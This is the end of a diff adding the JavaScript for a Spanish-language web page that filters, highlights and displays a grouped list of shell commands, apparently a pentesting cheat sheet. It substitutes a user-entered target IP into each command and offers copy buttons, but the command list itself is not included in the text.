+function matches(r){
+  const [phase,desc,why,cmd]=r;
+  if(activePhase&&phase!==activePhase)return false;
+  if(!query)return true;
+  return (desc+" "+why+" "+cmd+" "+META[phase].n).toLowerCase().includes(query);
+}
+function hl(text){
+  if(!query)return esc(text);
+  const i=text.toLowerCase().indexOf(query);
+  if(i<0)return esc(text);
+  return esc(text.slice(0,i))+"<mark>"+esc(text.slice(i,i+query.length))+"</mark>"+esc(text.slice(i+query.length));
+}
+
+function render(){
+  const rows=D.filter(matches);
+  countEl.innerHTML=`<b>${rows.length}</b> comando${rows.length!==1?"s":""}`+
+    (activePhase?` · ${META[activePhase].n}`:"")+(query?` · "${query}"`:"");
+
+  if(!rows.length){
+    listEl.innerHTML=`<div class="empty"><span class="p">$</span> sin resultados para "${esc(query)}"</div>`;
+    return;
+  }
+  let html="";
+  for(const phase of ORDER){
+    const g=rows.filter(r=>r[0]===phase);
+    if(!g.length)continue;
+    html+=`<div class="group"><div class="group-h"><span class="sq">##</span>${META[phase].n}</div>`;
+    for(const [,desc,why,cmd] of g){
+      const shown=applyIP(cmd);
+      const finalCode=highlightWithIP(shown);
+      html+=`<div class="cmd">
+        <div class="desc"><span class="b">${hl(desc)}</span>${why?`<span class="why">— ${hl(why)}</span>`:""}</div>
+        <div class="cmd-row">
+          <code>${finalCode}</code>
+          <button class="copy" data-cmd="${encodeURIComponent(shown)}">
+            ${COPY_ICON}<span>copiar</span></button>
+        </div></div>`;
+    }
+    html+=`</div>`;
+  }
+  listEl.innerHTML=html;
+}
+
+// highlight que además pinta la IP objetivo
+function highlightWithIP(cmd){
+  const ip=ipEl.value.trim();
+  if(cmd.startsWith("#"))return `<span class="cmt">${esc(cmd)}</span>`;
+  let h=esc(cmd);
+  h=h.replace(TOOLS,m=>{
+    const parts=m.split(/(\s+)/);
+    return parts.map(x=>/^\s+$/.test(x)||x==="sudo"?x:`<span class="tool">${x}</span>`).join("");
+  });
+  h=h.replace(/(\s)(-{1,2}[a-zA-Z][\w-]*)/g,'$1<span class="flag">$2</span>');
+  h=h.replace(/('[^']*')/g,'<span class="str">$1</span>');
+  h=h.replace(/(#[^<]*)$/g,'<span class="cmt">$1</span>');
+  if(ip){
+    const safe=ip.replace(/[.*+?^${}()|[\]\\]/g,"\\$&");
+    h=h.replace(new RegExp(safe,"g"),`<span class="var">${esc(ip)}</span>`);
+  }else{
+    h=h.replace(/\{IP\}/g,'<span class="var">{IP}</span>');
+  }
+  return h;
+}
+
+listEl.addEventListener("click",async e=>{
+  const b=e.target.closest(".copy"); if(!b)return;
+  const text=decodeURIComponent(b.dataset.cmd);
+  try{await navigator.clipboard.writeText(text)}
+  catch{const t=document.createElement("textarea");t.value=text;document.body.appendChild(t);t.select();document.execCommand("copy");t.remove()}
+  b.innerHTML=`${CHECK_ICON}<span>copiado</span>`; b.classList.add("done");
+  setTimeout(()=>{b.innerHTML=`${COPY_ICON}<span>copiar</span>`;b.classList.remove("done")},1200);
+});
+
+document.addEventListener("keydown",e=>{
+  if(e.key==="/"&&document.activeElement!==searchEl&&document.activeElement!==ipEl){e.preventDefault();searchEl.focus()}
+  if(e.key==="Escape"){searchEl.value="";query="";searchEl.blur();render()}
+});
+
+render();
+</script>
+</body>
+</html>
